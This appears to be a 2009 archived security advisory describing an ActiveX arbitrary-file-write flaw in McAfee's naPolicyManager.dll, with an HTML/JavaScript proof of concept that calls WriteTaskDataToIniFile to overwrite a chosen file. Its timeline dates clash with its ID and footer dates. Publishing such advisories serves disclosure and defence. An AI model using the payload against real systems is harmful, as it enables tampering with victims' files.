@@ -1,0 +1,84 @@
+GOODFELLAS Security Research TEAM
+http://goodfellas.shellcode.com.ar
+Greetings to str0ke
+
+
+McAfee, Inc. 3.6.0.608 Policy Manager naPolicyManager.dll Arbitrary Data Write
+==============================================================================
+
+Internal ID: VULWAR20090616.
+-----------
+
+
+Introduction
+------------
+
+naPolicyManager.dll is a library included in the Program Mc Afee inc.
+
+
+Tested In
+---------
+
+- Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.
+
+
+Summary
+-------
+
+The WriteTaskDataToIniFile method doesn't check if it's being called from the
+application or from a malicious user. A Remote Attacker could craft a 
+html page and overwrite arbitrary files in a system.
+
+
+Impact
+------
+
+The vulnerability could allow malicious users to write arbitrary data on a 
+vulnerable system that uses this software.
+
+
+Workaround
+----------
+
+- Activate the Kill bit zero in the clsid corresponding to the software.
+- Unregister naPolicyManager.dll using regsvr32.
+
+
+Timeline
+--------
+
+July 16 2009 -- Bug Discovery.
+July 16 2009 -- POC published.
+
+
+Credits
+-------
+
+ * callAX <bemariani@gmail.com>
+
+
+Technical Details
+-----------------
+
+WriteTaskDataToIniFile method receives one argument filename in this format
+"c:\path\file".
+
+
+Proof of Concept
+---------------
+
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{04D18721-749F-4140-AEB0-CAC099CA4741}"></object>
+<SCRIPT>
+function Do_1t()
+ {
+   File = "C:\b00t.ini"
+   ctrl.WriteTaskDataToIniFile(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_1t() type=button value="P0c">
+</BODY>
+</HTML>
+
+# milw0rm.com [2009-06-16]
